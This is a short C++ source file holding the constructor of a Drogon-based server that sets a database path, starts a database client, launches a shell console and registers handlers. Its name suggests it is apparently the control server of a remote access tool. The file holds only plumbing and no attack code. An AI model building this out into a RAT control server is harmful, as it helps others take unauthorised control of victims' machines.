#include "DrogonRatServer/Server.hpp"
#include "DrogonRatServer/debug.hpp"

namespace DrogonRatServer {

Server::Server(drogon::HttpAppFramework &Drogon_Singelton,
               const std::filesystem::path &Db_File_Path,
               const std::filesystem::path &Shell_Binary_Path)
    : handler(Drogon_Singelton) {
    INFO_LOG("Setting Handler's Database file Path to {}", Db_File_Path.string());
    this->handler.setDbFilePath(Db_File_Path);
    INFO_LOG("Initializing database client");
    this->handler.initDbClient().launchShellConsole(Shell_Binary_Path).registerAll();
}

} // namespace DrogonRatServer
